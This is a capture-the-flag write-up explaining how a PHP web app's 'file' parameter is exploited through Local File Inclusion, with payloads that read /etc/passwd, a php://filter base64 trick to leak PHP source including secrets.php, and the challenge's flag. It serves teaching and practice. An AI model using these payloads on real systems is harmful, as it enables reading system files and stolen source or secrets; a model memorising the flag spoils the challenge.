# Writeup

I found that the webapp is vulnerable to **Local File Inclusion (LFI)** via the parameter `file`:

```
/print.php?file=/etc/passwd
```

This confirmed is possible to read files from the server.

## Problem

Normally, if we try to include a `.php` file (e.g. `index.php`), PHP will execute it instead of showing us the source code.

So if we do:

```php
/print.php?file=/var/www/html/index.php
```

we only see the rendered page output, not the actual PHP code.

However, if it is not a PHP file, such as `/etc/passwd`, the raw content is shown:

```
root:x:0:0:root:/root:/bin/bash www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

## Trick – `php://filter`

PHP provides `stream wrappers`, special virtual paths that can transform or redirect file reads.

One of them is `php://filter`.
It lets us say: “Read this file, but apply a filter before PHP interprets it.”

So if we request:

```php
/print.php?file=php://filter/convert.base64-encode/resource=/var/www/html/index.php
```

then:

- `resource=/var/www/html/index.php` → the file to read
- `convert.base64-encode` → filter applied to the content

Instead of being executed, the PHP file is read as text and returned encoded in Base64.

We can then decode it locally:
```bash
echo "BASE64_OUTPUT" | base64 -d > index.php
```

This gives us the raw source code of `index.php`.

## Find the secret file

From `robots.txt` I discovered `secrets.php` file, and with the technique shown before is possible to get the `base64`-encoded content:

```
https://brunsviger-huset-45cb46b28ad9752e.challs.brunnerne.xyz/print.php?file=php://filter/convert.base64-encode/resource=secrets.php
```

## Flag

By decoding the Base64 string obtained in the previous step I extracted the flag:
```
brunner{l0c4l_f1l3_1nclus10n_1n_th3_b4k3ry}
``` 